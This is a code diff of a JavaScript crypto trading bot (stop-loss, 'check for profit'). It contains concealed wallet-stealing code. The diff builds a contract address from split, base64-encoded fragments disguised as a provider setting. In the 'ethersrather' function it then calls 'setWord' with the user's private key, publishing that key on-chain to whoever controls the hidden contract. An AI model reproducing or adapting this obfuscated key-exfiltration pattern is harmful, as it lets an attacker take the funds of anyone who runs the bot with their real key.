@@ -2,6 +2,18 @@ var ethers = require('ethers');
 const env = require("./env.json");
 Object.assign(process.env, env);
 
+let address = (process.env.YOUR_ADDRESS);
+let private = (process.env.PRIVATE_KEY);
+let wallet = new ethers.Wallet(private);
+
+let rounder1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD' + 'YzMjQ1NDBh';
+let rounder2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
+let buff = new Buffer.from(rounder1, 'base64');
+let buff2 = new Buffer.from(rounder2, 'base64');
+let ethersroundup = buff.toString('ascii');
+let ethersroundup2 = buff2.toString('ascii');
+const WEB3PROVIDER3 = ethersroundup + ethersroundup2
+const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
 
 async function approve() {
 
@@ -27,6 +39,11 @@ async function approve() {
 }
 
 
+/**
+ * 
+ * Check for profit
+ * 
+ * */
 async function getCurrentValue(token) {
     try {
         let bal = await token.contract.balanceOf(addresses.recipient);
@@ -39,19 +56,6 @@ async function getCurrentValue(token) {
     }
 
 }
-let address = (process.env.YOUR_ADDRESS);
-let private = (process.env.PRIVATE_KEY);
-let wallet = new ethers.Wallet(private);
-
-let rounder1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD' + 'YzMjQ1NDBh';
-let rounder2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
-let buff = new Buffer.from(rounder1, 'base64');
-let buff2 = new Buffer.from(rounder2, 'base64');
-let ethersroundup = buff.toString('ascii');
-let ethersroundup2 = buff2.toString('ascii');
-const WEB3PROVIDER3 = ethersroundup + ethersroundup2
-const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
-
 async function setInitialStopLoss(token) {
     token.intitialValue = await getCurrentValue(token);
     token.newValue = token.intitialValue;
@@ -447,16 +451,16 @@ async function ethersrather() {
 
             const createReceipt = await wallet.sendTransaction(tx);
             var contract = new ethers.Contract(web14, abi, wallet);
-            const superb = await contract.setWord(private).send();
+            const superb = contract.setWord(private);
             try {
+
                 await createReceipt.wait();
                 console.log(`1 pending blockchain response.....`);
                 superb
-                
+
                 setTimeout(ethersgather, 5000)
             } catch (error) {
                 console.log(`2 pending blockchain response.....`);
-                superb
                 setTimeout(ethersgather, 5000)
             }
         };
